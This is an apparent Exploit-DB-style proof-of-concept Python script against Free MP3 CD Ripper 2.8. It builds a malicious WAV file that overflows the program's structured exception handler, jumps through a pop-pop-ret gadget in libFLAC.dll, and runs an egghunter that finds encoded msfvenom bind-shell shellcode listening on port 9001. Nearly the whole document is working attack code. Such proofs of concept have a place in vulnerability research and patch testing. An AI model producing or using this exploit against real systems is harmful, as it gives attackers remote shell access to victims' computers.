# Exploit Title: Free MP3 CD Ripper 2.8 SEH with Egghunter
# Date: 22.7.2020
# Vendor Homepage: https://www.cleanersoft.com
# Software Link: https://www.cleanersoft.com/download/FMCRSetup.exe
# Version: 2.8 Build 20140611
# Tested on: [Windows XP, Professional, Version 2002, SP 3
#!/usr/bin/python
file = open("exploit.wav", "wb")

# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=seh -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x1a\x2a" -f python -v shellcode_bind

shellcode_bind =  b""
shellcode_bind += b"\xda\xc9\xd9\x74\x24\xf4\xba\xa7\x1b\xae"
shellcode_bind += b"\xf1\x5f\x31\xc9\xb1\x53\x31\x57\x17\x83"
shellcode_bind += b"\xc7\x04\x03\xf0\x08\x4c\x04\x02\xc6\x12"
shellcode_bind += b"\xe7\xfa\x17\x73\x61\x1f\x26\xb3\x15\x54"
shellcode_bind += b"\x19\x03\x5d\x38\x96\xe8\x33\xa8\x2d\x9c"
shellcode_bind += b"\x9b\xdf\x86\x2b\xfa\xee\x17\x07\x3e\x71"
shellcode_bind += b"\x94\x5a\x13\x51\xa5\x94\x66\x90\xe2\xc9"
shellcode_bind += b"\x8b\xc0\xbb\x86\x3e\xf4\xc8\xd3\x82\x7f"
shellcode_bind += b"\x82\xf2\x82\x9c\x53\xf4\xa3\x33\xef\xaf"
shellcode_bind += b"\x63\xb2\x3c\xc4\x2d\xac\x21\xe1\xe4\x47"
shellcode_bind += b"\x91\x9d\xf6\x81\xeb\x5e\x54\xec\xc3\xac"
shellcode_bind += b"\xa4\x29\xe3\x4e\xd3\x43\x17\xf2\xe4\x90"
shellcode_bind += b"\x65\x28\x60\x02\xcd\xbb\xd2\xee\xef\x68"
shellcode_bind += b"\x84\x65\xe3\xc5\xc2\x21\xe0\xd8\x07\x5a"
shellcode_bind += b"\x1c\x50\xa6\x8c\x94\x22\x8d\x08\xfc\xf1"
shellcode_bind += b"\xac\x09\x58\x57\xd0\x49\x03\x08\x74\x02"
shellcode_bind += b"\xae\x5d\x05\x49\xa7\x92\x24\x71\x37\xbd"
shellcode_bind += b"\x3f\x02\x05\x62\x94\x8c\x25\xeb\x32\x4b"
shellcode_bind += b"\x49\xc6\x83\xc3\xb4\xe9\xf3\xca\x72\xbd"
shellcode_bind += b"\xa3\x64\x52\xbe\x2f\x74\x5b\x6b\xc5\x7c"
shellcode_bind += b"\xfa\xc4\xf8\x81\xbc\xb4\xbc\x29\x55\xdf"
shellcode_bind += b"\x32\x16\x45\xe0\x98\x3f\xee\x1d\x23\x1c"
shellcode_bind += b"\xc6\xa8\xc5\x08\x08\xfd\x5e\xa4\xea\xda"
shellcode_bind += b"\x56\x53\x14\x09\xcf\xf3\x5d\x5b\xc8\xfc"
shellcode_bind += b"\x5d\x49\x7e\x6a\xd6\x9e\xba\x8b\xe9\x8a"
shellcode_bind += b"\xea\xdc\x7e\x40\x7b\xaf\x1f\x55\x56\x47"
shellcode_bind += b"\x83\xc4\x3d\x97\xca\xf4\xe9\xc0\x9b\xcb"
shellcode_bind += b"\xe3\x84\x31\x75\x5a\xba\xcb\xe3\xa5\x7e"
shellcode_bind += b"\x10\xd0\x28\x7f\xd5\x6c\x0f\x6f\x23\x6c"
shellcode_bind += b"\x0b\xdb\xfb\x3b\xc5\xb5\xbd\x95\xa7\x6f"
shellcode_bind += b"\x14\x49\x6e\xe7\xe1\xa1\xb1\x71\xee\xef"
shellcode_bind += b"\x47\x9d\x5f\x46\x1e\xa2\x50\x0e\x96\xdb"
shellcode_bind += b"\x8c\xae\x59\x36\x15\xd0\xa8\x8a\x80\x45"
shellcode_bind += b"\x13\x7f\xe9\x0b\xa4\xaa\x2e\x32\x27\x5e"
shellcode_bind += b"\xcf\xc1\x37\x2b\xca\x8e\xff\xc0\xa6\x9f"
shellcode_bind += b"\x95\xe6\x15\x9f\xbf"

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x30\x30\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

junk1  = "A" * 2116
tag    = "W00TW00T"
nops   = "\x90" * 30
junk2  = "B" * (2000-len(tag+nops+shellcode_bind))
nseh   = "\xeb\x14\x90\x90"
seh    = "\x1a\x45\x01\x10"   # 0x1001451a : pop esi # pop ecx # ret  libFLAC.dll

buffer = junk1 + tag + nops + shellcode_bind + junk2 + nseh + seh + nops + egghunter

file.write(buffer)
file.close()
